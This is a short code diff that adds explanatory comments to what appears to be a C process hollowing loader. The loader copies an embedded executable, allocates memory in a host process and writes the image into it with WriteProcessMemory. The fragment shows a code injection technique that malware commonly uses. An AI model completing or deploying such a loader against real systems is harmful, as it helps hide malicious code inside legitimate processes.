@@ -99,9 +99,15 @@ INT main() {
 	pBuffer = VirtualAlloc(0, dwExeSize, MEM_COMMIT, PAGE_READWRITE);
 	memcpy(pBuffer, hgExe, dwExeSize);
 	
+	//
+	// Get source image and headers
+	//
 	pSourceImage = GetLoadedImage((DWORD)pBuffer);
 	pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
 	
+	//
+	// Allocate buffer in host process
+	//
 	printf("[*] Allocating memory\r\n");
 	pRemoteImage = VirtualAllocEx(hHostProcess,
 		pPEB->lpImageBaseAddress,
@@ -120,6 +126,9 @@ INT main() {
 	printf("[*] Destination image base: 0x%p\r\n", pPEB->lpImageBaseAddress);
 	printf("[*] Relocation delta: 0x%p\r\n", dwDelta);
 
+	//
+	// Write source to host process
+	//
 	if (!WriteProcessMemory(hHostProcess,
 		pPEB->lpImageBaseAddress,
 		pBuffer,
